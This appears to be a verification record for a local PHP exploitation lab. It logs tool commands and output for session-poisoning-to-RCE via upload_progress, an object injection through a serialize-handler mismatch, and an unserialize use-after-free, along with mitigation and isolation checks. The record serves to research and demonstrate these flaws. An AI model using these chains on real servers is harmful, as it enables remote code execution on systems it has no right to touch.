# Verification record — 2026-10-21

Portable, command-by-command record behind the README claims. Everything below
was run locally against this repository's lab.

## Environment

| component | version |
|---|---|
| PHP (lab) | 8.2.34 (cli + fpm, NTS) |
| nginx (lab) | 1.31.7 (alpine) |
| docker | 29.9.2 |
| docker compose | 5.6.0 |
| python | 3.14.8 (stdlib only) |

## Chain 1 — poison → include → command execution

```sh
python3 php2shell.py up
python3 php2shell.py rce --cmd 'id'
```

```
[+] session file poisoned with a base64 payload (412 bytes)
[+] RCE via include, cmd='id':
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Payload escaping re-checked with quotes and backslashes in the command
(`--cmd 'echo "hello world"; printf "a\\b\n"'`): the command runs verbatim
because it is base64-encoded inside the PHP payload and the multipart filename
stays ASCII.

## Chain 2 — handler mismatch → object instantiation

`/app/*` uses `session.serialize_handler = php_serialize`, `/api/*` uses
`php`. The writer stores the session as one serialized array; the injected
`x|O:6:"Gadget":0:{}` inside the uploaded filename then sits after a `|` that
the `php` reader treats as a key separator.

```
python3 php2shell.py mismatch
[+] Gadget was instantiated in the api/ endpoint (__destruct marker: /tmp/gadget-hit -> 'object-instantiated')
    (the session handler also reported a decode failure)
```

Notes:

- Proof is the `__destruct` marker file written by the `Gadget` class in
  `templates/webroot/api/endpoint.php`, not the warning string.
- The read request must be a plain `GET` (no upload_progress field). A
  multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` starts the session during
  RINIT, before any userland class exists, so the object can never be
  instantiated that way — the original `POST`-based check could only ever see
  the decode warning.
- `--class Nope` fails as expected (decode warning, no marker, exit 1).

## UAF — `unserialize()` var_destroy/`__destruct` reentry

```
python3 php2shell.py uaf
[*] R:1500 resolved to: integer
[+] UAF behavior: stale var_hash read
```

ASAN build (`CFLAGS='-fsanitize=address -g -O1' LDFLAGS='-fsanitize=address'`,
`USE_ZEND_ALLOC=0`, php-8.2.34):

- `ERROR: AddressSanitizer: heap-use-after-free`
- READ of size 8 at `ext/standard/var_unserializer.c:850`
- freed at `var_unserializer.c:245` (`var_destroy`, 8160 B `var_hash` chunk)

## Not reproduced

The upload_progress "UAF → `zend_call_function`" forge did not reproduce on
stock builds: with correct per-build symbols (dtor `0x566a50`, call `0x559b10`,
delta `0xcf40`, php-fpm 8.2.34) neither CVE-2026-109618 nor 109619 delivery
produced RCE, a crash, or a worker-count change. CVE records are RESERVED;
every number-to-mechanism mapping seen in community repos is unconfirmed.

## Isolation checks

```sh
ss -ltnp | grep 18081       # 127.0.0.1:18081 only
docker compose ... ps       # no published 9000/9001
```

Both containers report `(healthy)`; `up` returns after `compose up --wait`
instead of polling.

## Mitigation check (`session.upload_progress.enabled = Off`)

```sh
sed -i 's/^session.upload_progress.enabled = On/session.upload_progress.enabled = Off/' lab/php.ini
python3 php2shell.py up          # --force-recreate applies the ini change
python3 php2shell.py rce         # -> [-] no session file was written
python3 php2shell.py mismatch    # -> [-] no session file was written
python3 php2shell.py up --regen  # restore the vulnerable lab
python3 php2shell.py rce --cmd id  # -> uid=33(www-data) again
```

The mitigation and detection pointers live in
[mechanisms.md](mechanisms.md) (sections 6-7).

## Negative result: aborted upload with stock `cleanup=On`

Ephemeral probe (not part of the CLI): a raw socket sends the multipart head
(`PHPSESSID`, `PHP_SESSION_UPLOAD_PROGRESS`, file part with the payload
filename), a partial file body, then closes the connection. Tested with
0/1 KiB/64 KiB/300 KiB of body and 0.2-1.5 s stalls, `fastcgi_request_buffering`
on and off. No `sess_<sid>` file appeared at any point, so the stock-cleanup
variant is not reachable through this nginx + php-fpm stack. The lab therefore
keeps the deterministic `cleanup=Off` path.

## Repository checks

```sh
pytest -q                # 33 unit tests
pytest -q -m integration # up -> rce -> mismatch -> uaf -> down
ruff check . && ruff format --check .
python3 php2shell.py gen && docker compose -f lab/docker-compose.yml config -q
```

